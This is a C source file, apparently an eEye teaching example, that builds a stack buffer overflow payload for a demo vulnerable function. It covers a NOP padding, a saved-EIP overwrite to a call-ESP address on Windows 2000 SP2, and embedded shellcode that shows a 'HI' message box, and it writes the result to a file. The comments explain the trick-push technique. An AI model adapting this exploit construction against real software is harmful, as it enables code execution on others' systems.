#include <Windows.h>
/*
	Example NT Exploit
	Ryan Permeh, ryan@eeye.com

  This is a program to explain and generate a sample
  exploit for our overflowable function.

  It uses hardcoded addresses of functions, so it may
  not work on a different platform than win2k sp2.

  It is inteded to be simple, not protable.  To make
  it run on a different platform, replace the #define's
  with addresses of those functions as exposed by 
  depends.exe.  depends.exe ships with visual studio.

  The only mildly advanced feature this code uses is the
  trick push.  A trick push is when call is used to trick
  the stack into thinking that an address was pushed.
  In this case, every time we do a trick push, we want
  to push the address of our following string on to the 
  stack.  This allows us to embed our data right into
  our code.  This also has the benefit of not having
  to know where exactly where our code is executing,
  or direct offsets into our shellcode.  
	This trick works based on the fact that a call
  will push the next instruction onto the stack as
  if it were a saved EIP intended to return to at a
  later time.  We are exploiting this inherent behaviour
  to push the address of our string onto the stack.


  Because of the builtin visual studio compiler's behaviour,
  we are required to use _emit to embed our string in the code.
  */

int main(int argc,char **argv)
{
#define MBOX	0x77E375D5
#define LL		0x77E8A254
#define EP		0x77E98F94

	DWORD  eip=0x77E8250A; // a pointer to a 
						//call esp in KERNEL32.dll
						//found with findoffset.c
	BYTE   writeme[65]; //mass overflow holder
	BYTE   code[49] ={
				0xE8, 0x07, 0x00, 0x00, 0x00, 0x55, 
				0x53, 0x45, 0x52, 0x33, 0x32, 0x00, 
				0xB8, 0x54, 0xA2, 0xE8, 0x77, 0xFF, 
				0xD0, 0x6A, 0x00, 0x6A, 0x00, 0xE8, 
				0x03, 0x00, 0x00, 0x00, 0x48, 0x49, 
				0x00, 0x6A, 0x00, 0xB8, 0xD5, 0x75, 
				0xE3, 0x77, 0xFF, 0xD0, 0x6A, 0x01, 
				0xB8, 0x94, 0x8F, 0xE9, 0x77, 0xFF, 
				0xD0
				};
	HANDLE		file;
	DWORD		written;
/*
	
	__asm
	{
		call		tag1	;	jump over(trick push)
		_emit		0x55 	;	"USER32",0x00
		_emit		0x53 
		_emit		0x45
		_emit		0x52
		_emit		0x33
		_emit		0x32
		_emit		0x00 
tag1:
//	LoadLibrary("USER32");
		mov			eax, LL ;put the LoadLibraryA address in eax
		call        eax		;call LoadLibraryA
		push        0		;push MBOX_OK(4th arg to mbox)
		push        0		;push NULL(3rd arg to mbox)
		call		tag2	; jump over(trick push)
		_emit		0x48 	;	"HI",0x00
		_emit		0x49 
		_emit		0x00	
tag2:
		push        0		;push NULL(1st arg to mbox)
		//		MessageBox (NULL, "hi", NULL, MB_OK);
		mov			eax, MBOX	;put the MessageBox address in eax
		call        eax			;Call MessageBox
		push		1			;push 1 (only arg to exit)
		//		ExitProcess(1);	
		mov			eax, EP	; put the ExitProcess address in eax
		call		eax		;call ExitProcess
	}
*/

	
	
/*
	char *i=code; //simple test code pointer
	//this is to test the code
	__asm
	{
		mov eax, i
		call eax
	}
*/
	/* our overflow string looks like this:

		[0x90*12][eip][code]

		the 0x90(nop) overwrite the buffer, and the saved
		ebp on the stack, then eip replaces the saved eip
		on the stack.  the saved EIP is repalced with a 
		jump address that points to a call ESP.  When call
		ESP executes, it executes our code waiting in ESP
		*/
	
	memset(writeme,0x90,65); //set my local string to nops
	memcpy(writeme+12,&eip,4); //overwrite eip here
	memcpy(writeme+16,code,49); // copy the code into our temp buf

	//open the file
	file=CreateFile("c:\\badfile",GENERIC_ALL,0,NULL,OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,NULL);
	//write our shellcode to the file
	WriteFile(file,writeme,65,&written,NULL);
	//we're done
	return 1;
}